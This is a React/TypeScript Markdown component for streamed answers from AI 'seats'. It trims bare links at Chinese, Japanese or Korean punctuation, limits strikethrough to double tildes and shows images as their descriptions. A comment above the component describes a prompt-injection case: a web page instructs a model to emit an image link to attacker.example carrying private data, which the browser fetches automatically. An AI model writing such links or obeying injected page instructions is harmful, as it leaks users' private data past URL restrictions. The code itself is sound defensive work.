"use client";

import { cutAtCjkPunctuation } from "@homestorm/shared";
import { memo } from "react";
import ReactMarkdown, { type Options } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";
import { cn } from "@/lib/utils";

interface MdNode {
  type: string;
  url?: string;
  value?: string;
  children?: MdNode[];
}

/**
 * A bare link stops at Chinese punctuation. remark-gfm only stops at whitespace, so in Chinese, Japanese or Korean
 * text a link ran on into the sentence after it and went nowhere. Only bare links change: `[text](url)` says exactly
 * where it ends.
 */
function remarkEndBareLinks() {
  const walk = (node: MdNode) => {
    const children = node.children;
    if (!children) return;
    for (let i = children.length - 1; i >= 0; i--) {
      const child = children[i] as MdNode;
      walk(child);
      const label = child.children?.[0];
      if (child.type !== "link" || child.children?.length !== 1 || label?.type !== "text") continue;
      if (label.value !== child.url || !child.url) continue;
      const link = cutAtCjkPunctuation(child.url);
      if (link === child.url) continue;
      const rest = child.url.slice(link.length);
      child.url = link;
      label.value = link;
      children.splice(i + 1, 0, { type: "text", value: rest });
    }
  };
  return walk;
}

/**
 * A seat's answer as Markdown. Code is highlighted once the answer is finished: re-highlighting on every streamed
 * chunk would be wasted work.
 *
 * ⚠️ Images never load (ADR 0014). A web page can tell a model to write ![](https://attacker.example/?data=private),
 * and the browser would send that with no click at all, getting around the rule on which URLs seats may read. So an
 * image shows as its description.
 */
/**
 * GFM, but only `~~double~~` is strikethrough. Models write "~" for "about" ("~$350 (~$25/TB)"), and with GFM's
 * default a second "~" in the same paragraph struck through everything between them (found in a cluster meeting).
 */
const GFM_PLUGINS: NonNullable<Options["remarkPlugins"]> = [
  [remarkGfm, { singleTilde: false }],
  remarkEndBareLinks,
];

export const Markdown = memo(function Markdown({
  text,
  streaming = false,
}: {
  text: string;
  streaming?: boolean;
}) {
  return (
    <div className={cn("prose-msg text-sm", streaming && "stream-cursor")}>
      <ReactMarkdown
        remarkPlugins={GFM_PLUGINS}
        rehypePlugins={streaming ? [] : [[rehypeHighlight, { detect: false }]]}
        components={{
          a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noreferrer" />,
          img: ({ alt }) => (
            <span className="text-muted-foreground">[image: {alt || "no description"}]</span>
          ),
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
});
